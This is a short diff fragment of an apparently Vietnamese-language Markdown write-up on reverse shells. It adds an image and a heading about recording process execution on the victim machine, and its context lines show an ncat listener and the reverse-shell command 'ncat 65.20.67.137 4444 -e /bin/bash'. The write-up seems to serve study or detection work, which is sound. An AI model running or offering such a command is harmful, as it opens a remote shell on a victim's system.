@@ -266,3 +266,8 @@ ncat -lvnp 4444
 ncat 65.20.67.137 4444 -e /bin/bash
 ```
 
+<img width="557" height="70" alt="image" src="https://github.com/user-attachments/assets/b8010b6a-d040-4c9e-b6f2-bbe03fb2179f" />
+
+2. **Ghi nhận thực thi tiến trình trên máy nạn nhân**
+
+
